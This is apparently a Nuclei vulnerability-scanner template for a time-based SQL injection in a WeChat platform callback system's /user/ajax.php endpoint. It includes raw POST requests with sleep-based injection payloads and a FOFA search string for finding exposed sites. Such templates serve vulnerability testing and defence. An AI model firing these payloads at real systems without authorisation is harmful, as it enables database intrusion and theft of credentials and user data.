http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /user/ajax.php?act=siteadd HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          siteUrl=';select sleep(4)#'
        - |
          POST /user/ajax.php?act=siteadd HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          siteUrl=';select sleep(8)#'
id: wxgongzhonghuidiao-user_ajax-sql
info:
    author: Superhero
    description: |-
        fofa: body="mb-5 web-font-desc"
        微信公众平台无限回调系统 /user/ajax.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 微信公众平台无限回调系统 /user/ajax.php SQL注入漏洞
    reference:
        - https://superhero.blog.csdn.net/article/details/140629477
    severity: high
    tags: []
